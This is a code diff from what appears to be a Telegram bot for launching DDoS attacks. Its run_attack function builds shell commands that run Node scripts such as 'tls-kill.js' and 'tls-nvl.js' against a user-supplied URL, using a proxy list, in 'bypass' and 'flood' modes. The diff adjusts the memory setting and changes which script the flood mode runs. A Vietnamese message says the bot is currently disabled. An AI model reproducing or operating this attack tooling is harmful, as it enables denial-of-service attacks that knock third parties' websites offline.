@@ -61,12 +61,12 @@ async def run_attack(url, attack_time, update, method, context):
         return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
     
     user_id = update.effective_user.id
-    heap_size = "--max-old-space-size=25600"
+    heap_size = "--max-old-space-size=16384"
     
  
     commands = {
         'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt bypass",
-        'flood': f"node {heap_size} update.js {url} {attack_time} 64 20 live.txt flood",
+        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood",
         'tls-nvl': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt" 
     }
 
